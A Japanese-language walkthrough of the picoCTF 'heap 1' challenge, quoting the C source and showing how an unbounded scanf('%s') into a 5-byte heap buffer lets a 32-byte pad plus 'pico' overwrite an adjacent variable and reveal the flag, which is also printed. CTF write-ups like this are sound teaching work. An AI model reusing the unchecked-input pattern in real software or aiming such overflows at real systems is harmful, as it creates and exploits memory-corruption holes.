# picoCTF Writeup: heap 1

ヒープオーバーフローをやってみよう問題

- ジャンル: Binary Exploitation
- 難易度: Medium

## Writeup
問題文
>Can you control your overflow?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc tethys.picoctf.net 49554
>オーバーフローを制御できるかな？
>バイナリとソースはここからダウンロードできるよ。
>チャレンジインスタンスへの接続はこちら。

さて、まずはソースから見ていきます。

まずは`main`から
```
int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
`case4`で`check_win()`がflagに関係ありそうです。
`check_win()`をみてみます。
```
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
`safe_var`が`pico`であればflagが取れそうです。

さて、`safe_var`はどうやって作られてるのでしょうか。
```
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;
```

```
void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}
```

`malloc`でサイズ5byteでメモリ確保してますね。
`strncpy`で初期値として`bico`が入れられています。
さらに、`safe_var`の前に`input_data`も5byteで確保され、`pico`が入っていることがわかります。

これはヒープオーバーフローが怪しそうです。

`main`の`case 2`の`write_buffer()`で`scanf`がありますが、**%s**となっており、これはサイズチェックがされていません。
そのため、定義した5byte以上の文字列もメモリに格納することができてしまいます。
そうすると、`input_data`をはみ出して、`safe_var`のメモリ領域まで書き込めてしまうという。
```
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

さて、ここまでコードを読んで、アプローチまで考えたので、一回サーバーにつないでみます。
```
$ nc tethys.picoctf.net 61581

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x5713c47492b0  ->   pico
+-------------+----------------+
[*]   0x5713c47492d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```
`Heap State`のテーブルを見ると、`input_data`と`safe_var`のメモリ番地が表示されていますね。

```
$ python3 -c 'print(hex(0x5713c47492d0 - 0x5713c47492b0))'
0x20
```
`0x20`分、つまり32byte + "pico'を`input_data`に入れれば、`safe_var`に`"pico"が書き込まれることになるはずです。
```
$ nc tethys.picoctf.net 61581

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x64682f3702b0  ->   pico
+-------------+----------------+
[*]   0x64682f3702d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: 00000000000000000000000000000000pico
```
さて、`1`で`print`してみます。
```
Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x64682f3702b0  ->   00000000000000000000000000000000pico
+-------------+----------------+
[*]   0x64682f3702d0  ->   pico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```
おー、"pico"入ってますね。
では、`case 4`でflagをみてみます。
```
Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_ce5bee9b}
```
flagとれました。